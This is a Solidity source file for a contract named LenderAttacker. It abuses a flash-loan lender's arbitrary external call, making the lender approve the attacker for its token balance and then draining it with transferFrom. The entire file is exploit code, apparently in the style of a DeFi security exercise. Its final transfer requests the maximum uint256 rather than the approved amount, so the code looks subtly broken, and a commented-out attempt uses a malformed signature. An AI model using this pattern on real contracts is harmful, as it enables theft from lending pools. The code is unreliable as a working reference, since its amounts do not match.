//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILender {
    function deposit(uint256 amount) external;

    function borrow(
        uint256 amount,
        address target,
        address borrower,
        bytes calldata data
    ) external;
}

contract LenderAttacker {
    ILender public lender;
    IERC20 public token;

    constructor(address _token, address _lender) {
        token = IERC20(_token);
        lender = ILender(_lender);
    }

    function attack() external {
        uint256 max = 2**256 - 1;
        // lender.borrow(0, address(lender), address(this),
        // abi.encodeWithSignature("IERC20.approve(address, uint256)",
        // address(this), max));

        // token.transferFrom(address(lender), address(this), max);

        bytes memory data = abi.encodeWithSignature( //
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(lender))
        );

        lender.borrow(0, address(token), address(this), data);
        token.transferFrom(address(lender), address(this), max);
    }
}